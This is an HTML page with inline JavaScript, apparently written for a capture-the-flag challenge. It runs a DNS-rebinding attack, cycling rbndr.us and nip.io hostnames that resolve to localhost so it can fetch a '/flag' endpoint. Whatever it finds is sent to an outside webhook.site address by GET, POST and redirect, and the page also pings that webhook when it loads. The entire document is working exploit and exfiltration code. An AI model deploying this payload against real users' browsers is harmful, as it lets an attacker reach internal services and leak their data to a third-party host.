<!DOCTYPE html>
<html>
<body>
<script>
const WEBHOOK = 'https://webhook.site/aeb7e887-f78a-487d-bb97-52b3842d26de';

// Test multiple DNS rebinding approaches
const targets = [
    'http://7f000001.c0a80001.rbndr.us/flag',
    'http://127.0.0.1.nip.io/flag',
    'http://localhost.127.0.0.1.nip.io/flag'
];

let attempt = 0;

function attack() {
    attempt++;
    if (attempt > 10) return;
    
    const target = targets[attempt % targets.length];
    
    fetch(target)
        .then(r => r.text())
        .then(data => {
            if (data && data.includes('CTF')) {
                // Found the flag!
                document.body.innerHTML = '<h1 style="color:green">FLAG: ' + data + '</h1>';
                // Send to webhook multiple ways
                fetch(WEBHOOK + '?flag=' + encodeURIComponent(data));
                fetch(WEBHOOK, {
                    method: 'POST',
                    body: 'flag=' + encodeURIComponent(data)
                });
                window.location = WEBHOOK + '?nav_flag=' + encodeURIComponent(data);
            }
        })
        .catch(err => {
            // Retry with next target
            setTimeout(attack, 2000);
        });
}

// Start
fetch(WEBHOOK + '?start=1');
setTimeout(attack, 1000);
</script>
<h3>DNS Rebinding Attack Running...</h3>
</body>
</html>
